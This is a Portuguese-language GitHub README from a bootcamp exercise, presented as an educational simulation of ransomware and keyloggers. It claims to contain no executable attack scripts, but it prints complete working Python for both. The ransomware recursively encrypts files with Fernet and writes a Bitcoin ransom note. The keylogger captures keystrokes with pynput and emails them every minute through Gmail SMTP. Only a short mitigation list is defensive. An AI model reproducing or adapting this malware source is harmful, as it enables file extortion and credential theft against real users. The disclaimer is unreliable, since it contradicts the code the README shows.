# Ransomware-e-Keylogger — Santander Bootcamp 2025 
---

## ⚡ Criado por Dan54317
**Autor / Contato:** [Dan54317](https://github.com/Dan54317)  
📧 Email: [ddannsilvasp@gmail.com](mailto:seu.email@exemplo.com) · 🔗 [LinkedIn](https://www.linkedin.com/in/daniel--70335b218 ) 



---
[![Criado por Dan54317](https://img.shields.io/badge/Cria%C3%A7%C3%A3o-Dan54317-blue?style=for-the-badge)](https://github.com/Dan54317)

**Resumo do Projeto**



Este trabalho foi elaborado para simulações educacionais sobre duas ameaças digitais --Ransomware e Keylogger-- desenvolvido em python e documentado de forma responsável. O projeto tem como finalidade entender como as ameaças operam, quais dados elas capturam ou criptografam. Como se proteger qual técnica de detecção e mitigação são eficaz para o mundo real.


---

> ⚠️ **atenção**: Ética e Segurança.
Por responsabilidade ética e legal, este repositório não inclui scripts executáveis que coletem teclas, criptografem arquivos ou exfiltrem dados.
O script foi produzido e testado em ambiente seguro e controlado. O uso indevido deste conteúdo fora de um ambiente autorizado pode caracterizar crime cibernético, conforme a legislação brasileira (Lei nº 12.737/2012 e Marco Civil da Internet).
---
 ## 🧭 Objetivos do desafio



   - Compreender o funcionamento prático de Ransomware e Keylogger;
  - Identificar como esses malwares exploram vulnerabilidades e brechas humanas;
  - Programar scripts simples em Python simulando ataques reais em ambiente controlado;
  - Refletir sobre estratégias de defesa e prevenção contra malwares;
  - Documentar seus experimentos e utilizar o GitHub como portfólio técnico.
---
# Desafio 

 ⚠️ **atenção**: simulação de ransomware aqui apresentada tem propósito pedagógico: entendimento, detecção e mitigação. Qualquer reprodução de técnicas em sistemas sem autorização constitui crime. Este repositório não fornece ferramentas para ataque.


# Ransomware

> Ransomware é um tipo de malware que sequestra dados do usuário, criptografando arquivos e impedindo o acesso a eles. Após a infecção, o criminoso exige um resgate (geralmente em criptomoedas) para liberar a chave de descriptografia. Esse tipo de ataque pode afetar tanto usuários comuns quanto empresas, causando grandes prejuízos financeiros e operacionais.

## Incluir a bilblioteca

`from cryptography.fernet import Fernet
import os`

## Função para carregar a chave
`def carregar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_arquivo:
        chave_arquivo.write(chave)`

## carregar chave salva em arquivo
   `return open("chave.key", "rb").read()`

## Função para criptografar arquivos
`def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_criptografados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_criptografados)`

## Função para encontrar arquivos a serem criptografados
`def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista`

## mensagem de resgate
`def criar_mensagem_resgate():
    mensagem = """
    Seus arquivos foram criptografados!
    Para recuperá-los, envie 1 Bitcoin para o endereço abaixo:
    [ENDEREÇO DE BITCOIN]
    Após o pagamento, envie um e-mail para [SEU EMAIL] com o comprovante.
    Você receberá a chave de descriptografia em até 24 horas.
    """
    with open("MENSAGEM_DE_RESCATE.txt", "w") as file:
        file.write(mensagem)`

##execução principal


`def main():
    carregar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("malware")  # Substitua pelo diretório alvo
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Criptografia concluída! Leia MENSAGEM_DE_RESCATE.txt para instruções.")`

## Execução principal
`if __name__ == "__main__":`
      `main()`
---


# Agora com nosso script para criptografar feito precisamos fazer o script para descriptografar.

---


## Importando as bibliotecas.

`from cryptography.fernet import Fernet 
import os`   

## Função para carregar a chave
`def carregar_chave():
    return open("chave.key", "rb").read()`  

    

## Função para descriptografar arquivos
`def descriptografar_arquivo(arquivo,chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados_criptografados = file.read()
        dados_descriptografados = f.decrypt(dados_criptografados)
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)`


        

## Função para encontrar arquivos a serem descriptografados
`def encontrar_arquivos(diretorio):  
    lista = []  
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py"  and not nome.endswith(".key"):
                lista.append(caminho)
    return lista`  
    



    
## Exemplo de uso

`def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos("malware")  # Substitua pelo diretório alvo
    for arquivo in arquivos:   
        descriptografar_arquivo(arquivo, chave)
    print("Descriptografia concluída! Seus arquivos foram restaurados.")`
    



## Execução principal   
`if __name__ == "__main__":  
    main()`

---


**"Após finalizar o script, criei arquivos de texto contendo dados sintéticos para simular informações exfiltradas. A imagem abaixo ilustra o formato e a estrutura dos arquivos gerados."**



---




<img width="655" height="533" alt="image" src="https://github.com/user-attachments/assets/2c75325c-33db-4a6e-bca1-85634df995b7" />


# executando teste.



Na imagem abaixo após rodar nosso script podemos observar que a Criptografia foi realizada com sucesso trazendo a mensagem CRIPTOGRAFIA CONCLUIDA !



<img width="1082" height="687" alt="image" src="https://github.com/user-attachments/assets/375061f9-90f8-4335-9682-9ef955153f01" />

---


Após a execução do script, observamos que todos os arquivos de texto no diretório-alvo foram criptografados, simulando de forma controlada o comportamento típico de um ransomware.




<img width="1188" height="702" alt="image" src="https://github.com/user-attachments/assets/59df70cc-a6ca-4379-8a96-7dc43d4a7282" />


---


Ransomware em execução dados criptografados e a mensagem de Resgate com os passos para reaver as informações na tela.

    `Seus arquivos foram criptografados!
    Para recuper�-los, envie 1 Bitcoin para o endere�o abaixo:
    [ENDERE�O DE BITCOIN]
    Ap�s o pagamento, envie um e-mail para [SEU EMAIL] com o comprovante.
    Voc� receber� a chave de descriptografia em at� 24 horas.`⁹


<img width="950" height="490" alt="image" src="https://github.com/user-attachments/assets/e8b3ef95-cbc9-4d33-bea9-65074bcb08f9" />

---

## Mitigação 

🛡️ Proteção de E-mail > Use filtros avançados contra phishing e anexos maliciosos
  
📧 Macros no Office > Desabilite macros em documentos do Word/Excel por padrão (/n)

🔍 Sandbox para Análise > Execute arquivos suspeitos em ambientes isolados primeiro (/n) 

🚫 Princípio do Menor Privilégio > Aplicativos e serviços rodam com permissões mínimas necessárias (/n)

⚡ Resposta a Incidentes > Tenha um plano de ação pronto para caso de infecção (/n)

🧹 Hábitos de Limpeza > Delete arquivos temporários e faça manutenção regular (/n)

📋 Inventário de Ativos > Mantenha lista atualizada de todos os dispositivos e softwares (/n)

🛡️ EDR/XDR > Use soluções de detecção e resposta em endpoints (além do antivírus) 
Foco em prevenção + detecção + resposta = defesa completa! 🔒



---

# Kelylogger

Keylogger é um tipo de software malicioso que captura tudo o que o usuário digita no teclado, como senhas, mensagens e dados pessoais. Ele é usado por criminosos para roubar informações confidenciais, geralmente de forma invisível e silenciosa.



---

## 

`from pynput import keyboard 
import smtplib
from email.mime.text import MIMEText        
from threading import Timer
from pathlib import Path
import logging`

# Configurar logging para arquivo


`log_path = Path(__file__).parent / "keylogger.log"
logging.basicConfig(
    filename=str(log_path),
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)`


log = ""`

# Configurações do email
`EMAIL_origem = "ranson112224@gmail.com"
EMAIL_destino = "ranson112224@gmail.com"
SENHA = "XXX XXX XXX XXXX"`

# Função para enviar o email com o log capturado
`def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Dados capturados pelo Keylogger'
        msg['From'] = EMAIL_origem
        msg['To'] = EMAIL_destino`
        `try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_origem, SENHA)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar email: {e}")`
    `log = ""  # Limpa o log após o envio
    Timer(60, enviar_email).start()`
# Função para capturar as teclas pressionadas
`def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[BACKSPACE]"
        elif key == keyboard.Key.esc:
            log += "[ESC]"
        elif key == keyboard.Key.tab:
            log += "\t"
        else:
            pass  # Ignora outras teclas especiais`
# Inicia o listener do teclado
            
`with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()  # Inicia o envio periódico de emails
    listener.join()`


      



## Autor / Contato

**Dan54317** — Autor e responsável pelo repositório.  
- GitHub: [github.com/Dan54317](https://github.com/Dan54317)  
- Email: [ddannsilvasp@gmail.com](mailto:seu.email@exemplo.com)  
- LinkedIn: https://www.linkedin.com/in/daniel--70335b218
  



# teste 
## teste 
### teste 

